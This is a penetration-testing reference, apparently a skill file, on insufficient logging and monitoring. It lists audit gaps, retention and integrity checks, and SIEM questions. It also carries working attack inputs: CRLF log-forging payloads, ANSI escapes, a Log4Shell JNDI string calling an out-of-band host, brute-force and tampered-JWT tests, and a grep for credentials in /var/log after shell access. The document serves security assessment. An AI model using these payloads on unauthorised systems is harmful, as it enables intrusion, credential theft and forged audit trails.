---
name: logging-monitoring
description: Insufficient logging and monitoring — detecting audit trail gaps, log injection, undetected attack chains, and evidence of security event blindness
---

# Insufficient Logging & Monitoring

Applications that don't log security events can't detect attacks in progress — and attackers know it. This category is about identifying what evidence trail would exist (or not exist) for an attacker operating in the application, and chaining it with other findings to demonstrate impact.

## Attack Surface

**Missing Audit Events**
- Failed authentication attempts not logged
- Successful logins without IP, user-agent, timestamp
- Privilege escalation events (role change, admin action) not recorded
- Password reset and account recovery not logged
- Session creation and destruction not tracked
- High-value transactions (payments, data export, user deletion) unlogged

**Log Content Gaps**
- Logs contain user-facing error messages but not the underlying security event
- Log entries missing: who, what, when, from where (IP + UA)
- No correlation ID across distributed services (event chain untraceable)
- Sensitive data in logs (passwords, tokens, PII — log injection target and compliance risk)

**Log Injection**
- User-controlled input written into logs without sanitization
- Newline injection: `username=admin%0aINFO: Successful login for root`
- ANSI escape injection: `\x1b[1;31m` in terminal-rendered logs
- Log forging to inject false audit records or hide attacker activity

**Alerting Absence**
- No alerting on repeated authentication failures (brute force undetected)
- No alerting on access to sensitive endpoints from new IPs
- No alerting on privilege escalation or role changes
- No SIEM correlation rules (application logs not fed into monitoring pipeline)

**Forensic Evidence Loss**
- Logs not persisted (only in-memory, lost on restart)
- Short log retention (< 90 days)
- Logs writable by the application user (tamperable)
- No log integrity mechanism (hash chain, WORM storage)

## Key Vulnerabilities

### Audit Trail Completeness Test

For each security-sensitive action, verify logged:
```
Authentication events:
  ✓ Failed login → logged with username, IP, timestamp
  ✓ Successful login → logged with session ID, IP, UA
  ✓ Logout → logged
  ✓ Password change → logged
  ✓ Password reset request → logged

Authorization events:
  ✓ Access denied (403) → logged
  ✓ Privilege escalation attempt → logged
  ✓ Admin action (create/delete user, change role) → logged

Data events:
  ✓ Bulk export / data download → logged
  ✓ PII access → logged
  ✓ Record deletion → logged
```

### Log Injection

Test any field that appears in application logs:
```
Username: admin
        2024-01-01 INFO Successful login for root [injected]
```

HTTP request:
```
POST /login
username=admin%0a2024-01-01+INFO+Successful+login+for+root+%5Binjected%5D&password=x
```

Test vectors:
```
%0a%0d  → CRLF (newline injection)
\n      → literal newline if not escaped
\r\n    → Windows CRLF
\x1b[1;31m  → ANSI red — alters terminal-rendered logs
${jndi:ldap://oast.host/a}  → Log4Shell if log output goes to Log4j
```

### Detecting Insufficient Monitoring (Behavioral Test)

Perform attacks that should trigger alerts, then check if any response occurs:
```
1. Brute-force login endpoint 50 times with wrong password
   → Was any rate limiting triggered? Any lockout? Any alert?

2. Access 20 endpoints that return 403
   → Did anything change? Any IP block? Any security team notification?

3. Trigger SQL error via injection attempt
   → Did the app log the payload? Is there evidence in access logs?

4. Make an API call with a tampered JWT
   → Was the tampered token attempt logged with the raw token value?
```

If none of these produce visible defensive responses → insufficient monitoring.

### Log Retention and Integrity

```
Questions to assess (via documentation, source code, or access):
- How long are logs retained? (PCI-DSS requires 1 year, 3 months immediately accessible)
- Are logs centralized (SIEM) or only on the application server?
- Can the application's own process overwrite or delete logs?
- Is there a log integrity mechanism (hash chain, CloudTrail, immutable storage)?
- Are security events searchable/queryable within < 1 hour?
```

### Sensitive Data in Logs

Search log output for:
```
/password=/i
/token=/i
/Authorization: Bearer/i
/api_key=/i
/ssn=/i, /credit.card/i, /cvv=/i
```

If found — double finding: log injection target AND compliance violation (GDPR, PCI).

### Undetected Attack Chain Demo

The most impactful way to demonstrate this finding:
1. Execute a multi-step attack chain (IDOR → data access → data export)
2. Show that each step succeeded
3. Show that no log entry exists for the attack path
4. Conclude: attacker could operate for extended period without detection

## Testing Methodology

1. **Trigger security events** — failed logins, 403s, injection probes, JWT tampering
2. **Check for rate limiting and lockout** — signs of active detection
3. **Log injection** — inject newlines/CRLF in all input fields that appear in logs
4. **Audit event review** — if source/log access available, verify completeness matrix
5. **Retention check** — query events from 90 days ago; available?
6. **Integrity check** — can log entries be modified by app process?
7. **SIEM/alerting** — any indication of centralized log aggregation (Splunk, ELK, Datadog)?
8. **Sensitive data scan** — search log samples for credentials, tokens, PII

## Impact

- **Extended dwell time**: attackers operate undetected for months (industry average: 197 days)
- **No forensic evidence**: incident response cannot reconstruct the attack chain
- **Log injection**: false audit records created → plausible deniability for attacker, compliance failure
- **Compliance violations**: GDPR Art. 32, PCI-DSS req. 10, ISO 27001 A.12.4 require adequate logging

## Pro Tips

1. Pair "Insufficient Logging" with another finding — show the attack that went undetected, not just the missing log line
2. Log4Shell (`${jndi:...}`) only triggers if the app uses Log4j AND passes user input to a logger — test via User-Agent, username, search fields
3. `nikto -h <target>` generates noisy scan traffic — check if any defensive response occurs (IP block, CAPTCHA, alert)
4. Look for `/actuator/loggers` (Spring Boot) — if accessible, can dynamically set log level to DEBUG → may expose credentials in verbose output
5. Check error responses for stack traces — if stack traces reach users, they're also likely being logged in full, increasing log injection impact
6. Cloud environments: check if CloudTrail / GCP Audit Logs / Azure Monitor are enabled — absence is a separate finding
7. `grep -r "password\|token\|secret" /var/log/` if shell access is obtained — immediate compliance finding if results found
